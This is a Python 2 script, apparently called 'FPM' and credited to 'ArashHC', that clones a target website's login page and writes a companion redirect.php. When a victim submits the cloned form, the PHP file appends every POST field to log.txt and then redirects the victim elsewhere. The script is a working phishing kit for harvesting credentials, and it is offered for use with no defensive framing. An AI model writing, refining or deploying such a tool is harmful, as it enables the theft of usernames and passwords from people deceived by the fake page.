#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2,sys

print """_______________________  ___
___  ____/__  __ \__   |/  /
__  /_   __  /_/ /_  /|_/ / 
_  __/   _  ____/_  /  / /  
/_/      /_/     /_/  /_/   
                            """
print "Version 1, By ArashHC\n"

Url = raw_input("Enter Target Url: ")
RedirectTo = raw_input("Redirect To: ")

Source = ""
try:
    Source = urllib2.urlopen(Url).read()
except:
    print "Page Not Found!"
    sys.exit()

Site = ""
for i in range(0,len(Url.split('/'))-1):
    Site += Url.split('/')[i]+'/'
FirstDir = Url.split('/')[0] + "/" + Url.split('/')[1] + "/" + Url.split('/')[2] + "/"

try:
    Source = Source.replace("'",'"')
except:
    pass

try:
    Source = Source.replace("href=\"//http://", "href=\"http://")
except:
    pass

try:
    Source = Source.replace("url(//http://", "url(http://")
except:
    pass

try:
    Source = Source.replace("src=\"//http://", "src=\"http://")
except:
    pass

try:
    Source = Source.replace("href=\"//", "href=\"http://")
except:
    pass

try:
    Source = Source.replace("url(//", "url(http://")
except:
    pass

try:
    Source = Source.replace("src=\"//", "src=\"http://")
except:
    pass

Action = Source.split("action=\"")[1].split("\"")[0]

if Action != "":
    Source = Source.replace("action=\"" + Action + "\"", "action=\"" + "redirect.php" + "\"")
else:
    Source = Source.replace("method=\"post\"", "action=\"" + "redirect.php" + "\" method=\"post\"")

arr = []
S = ""
try:
    arr = Source.split("src=\"/")
    for i in range(0,len(arr)):
        if(i!= len(arr)-1):
            S += arr[i] + "src=\"" + FirstDir
        else:
            S += arr[i]
    Source = S
    S = ""
except:
    pass
try:
    arr = Source.split("src=\"")
    for i in range(0,len(arr)):
        try:
            if arr[i+1][0:4] != "http":
               if i != len(arr) - 1:
                   S += arr[i] + "src=\"" + Site
               else:
                   S += arr[i]
            else:
                S += arr[i] + "src=\""
        except:
            pass
    Source = S
    S = ""
except:
    pass

try:
    arr = Source.split("href=\"/")
    for i in range(0,len(arr)):
        if(i!= len(arr)-1):
            S += arr[i] + "href=\"" + FirstDir
        else:
            S += arr[i]
    Source = S
    S = ""
except:
    pass
try:
    arr = Source.split("href=\"")
    for i in range(0,len(arr)):
        try:
            if arr[i+1][0:4] != "http":
               if i != len(arr) - 1:
                   S += arr[i] + "href=\"" + Site
               else:
                   S += arr[i]
            else:
                S += arr[i] + "href=\""
        except:
            pass
    Source = S
    S = ""
except:
    pass

try:
    Source = Source.replace("url('","url!@")
    arr = Source.split("url!@")
    for i in range(0,len(arr)):
        try:
            if arr[i+1][0:4] == "http":
                if i != len(arr)-1:
                    S += arr[i] + "url!@" + Site
                else:
                    S += arr[i]
            else:
                S += arr[i] + "url!@"
        except:
            S += arr[i]
    Source = S.replace("url!@", "url('")
    S = ""
except:
    pass

f = open(Url.split('/')[2]+".html",'w')
f.write(Source)
f.close()

f = open("redirect.php",'w')
f.write("""<?php
header ('Location: """ + RedirectTo + """');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\\r\\n");
}
fwrite($handle, "\\r\\n");
fclose($handle);
exit;
?>""")
f.close()

print "Created Successfully!"